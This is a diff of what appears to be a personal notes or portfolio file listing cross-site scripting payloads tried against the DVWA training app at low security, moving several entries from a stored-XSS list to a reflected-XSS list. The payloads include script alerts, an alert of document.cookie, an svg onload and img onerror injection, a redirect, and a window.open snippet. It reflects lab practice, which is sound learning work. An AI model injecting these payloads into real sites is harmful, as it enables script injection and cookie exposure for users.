@@ -125,21 +125,6 @@ Security Level: Low (DVWA Security -> Low)
 # Message 1:
 <script>alert("your data is at risk")</script>
 
-# Message 2:
-<script>alert(document.baseURI);</script>
-
-# Message 3:
-</script><svg onload=alert('Danger')>
-
-# Message 4:
-<img src="x" onerror="alert('Danger')">
-
-# Message 5:
-<script>
-  var newwindow = window.open('', '', 'height=800,width=800');
-  newwindow.resizeTo(800, 800);
-</script>
-
  XSS (REFLECTED)
 # Payload 1:
 <script>alert(document.cookie)</script>
@@ -148,10 +133,23 @@ Security Level: Low (DVWA Security -> Low)
 <script>window.location = "https://www.w3schools.com/";</script>
 
 # Payload 3:
+<script>alert(document.baseURI);</script>
+
+#Payload 4:
+</script><svg onload=alert('Danger')>
+
+#Payload 5:
+<img src="x" onerror="alert('Danger')">
+
+#Payload 6:
+
 <script>
-  var ip = '192.168.2.49';
-  document.write("IP address: " + ip);
-</script>`,
+  var newwindow = window.open('', '', 'height=800,width=800');
+  newwindow.resizeTo(800, 800);
+</script>
+
+
+`,
       },
       {
         title: "Audit Pol",
